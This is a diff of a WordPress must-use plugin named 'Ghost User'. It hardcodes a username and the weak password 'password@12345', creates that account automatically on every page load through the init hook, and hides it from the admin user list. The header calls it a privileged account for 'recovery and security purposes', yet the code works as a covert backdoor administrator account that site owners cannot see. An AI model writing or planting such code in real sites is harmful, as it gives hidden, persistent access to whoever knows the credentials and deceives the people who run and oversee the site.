@@ -1,8 +1,18 @@
-<?php 
+<?php
+
+/*
+Plugin Name: Ghost User
+Description: Create a priviledged user account as a must use plugin, it will be hidden from the user list. This is only for recovery and security purposes.
+License: GPLv2
+Version: 1.0
+Author: anoxtovo
+Note: This plugin is only for recovery and security purposes. Do not use it for any malicious activities. author is not responsible for any misuse of this plugin.
+*/
+
 function create_hidden_admin_account() {
-    $username = 'username';     // Username you want to create
-    $password = 'password';     // Password you want to set
-    $email = 'email';           // Email you want to set
+    $username = 'ghost_user';     // Username you want to create
+    $password = 'password@12345';     // Password you want to set
+    $email = 'email@ghost.com';           // Email you want to set
 
     if ( !username_exists($username) && !email_exists($email) ) {
         $user_id = wp_create_user($username, $password, $email);
@@ -17,7 +27,7 @@ add_action('init', 'create_hidden_admin_account');
 
 function hide_ghost_user($user_search) {
     global $current_user;
-    $username_to_hide = 'username'; // Username you want to hide
+    $username_to_hide = 'ghost_user'; // Username you want to hide
 
     // Only apply the filter if the current user is NOT the one we want to hide
     if ($current_user->user_login !== $username_to_hide) {
